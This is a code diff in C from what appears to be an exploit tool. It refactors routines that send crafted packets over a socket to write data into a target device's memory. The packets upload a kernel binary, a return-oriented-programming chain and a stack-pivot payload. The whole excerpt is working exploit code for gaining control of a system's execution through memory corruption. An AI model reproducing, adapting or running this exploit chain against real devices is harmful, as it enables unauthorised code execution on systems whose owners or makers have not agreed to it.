@@ -213,19 +213,19 @@ static int upload_to_memory(uint32_t dst, const void* data, uint32_t size)
   while (size > 0) {
     uint32_t to_send = 58;
     if (size < to_send) { // copying small sizes tends to fail so we pad the rest with 0
-      *(uint32_t*) (upload_data_payload + 87) = __builtin_bswap32(dst + offset);
-      *(uint32_t*) (upload_data_payload + 95) = __builtin_bswap32(to_send);
-      memcpy(upload_data_payload + 1, ((uint8_t*) data) + offset, size);
-      memset(upload_data_payload + 1 + size, 0, to_send - size);
+      upload_data_payload.rop[1] = BE32(dst + offset);
+      upload_data_payload.rop[3] = BE32(to_send);
+      memcpy(upload_data_payload.hid_buffer, ((uint8_t*) data) + offset, size);
+      memset(upload_data_payload.hid_buffer + size, 0, to_send - size);
       to_send = size;
     }
     else {
-      *(uint32_t*) (upload_data_payload + 87) = __builtin_bswap32(dst + offset);
-      *(uint32_t*) (upload_data_payload + 95) = __builtin_bswap32(to_send);
-      memcpy(upload_data_payload + 1, ((uint8_t*) data) + offset, to_send);
+      upload_data_payload.rop[1] = BE32(dst + offset);
+      upload_data_payload.rop[3] = BE32(to_send);
+      memcpy(upload_data_payload.hid_buffer, ((uint8_t*) data) + offset, to_send);
     }
 
-    int res = send(int_fd, upload_data_payload, sizeof(upload_data_payload), 0);
+    int res = send(int_fd, &upload_data_payload, sizeof(upload_data_payload), 0);
     if (res != sizeof(upload_data_payload)) {
       return -1;
     }
@@ -416,11 +416,7 @@ int main(int argc, char *argv[])
         printf("kernel bin sent\n");
         usleep(1000 * 100);
 
-        final_rop_chain[184] = arm_kernel_size;
-
-        for (int i = 0; i < sizeof(final_rop_chain) / 4; i++) {
-          final_rop_chain[i] = __builtin_bswap32(final_rop_chain[i]);
-        }
+        final_rop_chain[184] = BE32(arm_kernel_size);
 
         res = upload_to_memory(ROP_CHAIN_LOCATION, final_rop_chain, sizeof(final_rop_chain));
         if (res != 0) {
@@ -431,7 +427,7 @@ int main(int argc, char *argv[])
         printf("rop sent\n");
         usleep(1000 * 100);
 
-        res = send(int_fd, stackpivot_payload, sizeof(stackpivot_payload), 0);
+        res = send(int_fd, &stackpivot_payload, sizeof(stackpivot_payload), 0);
         if (res != sizeof(stackpivot_payload)) {
           printf("failed to send stack pivot payload\n");
           break;
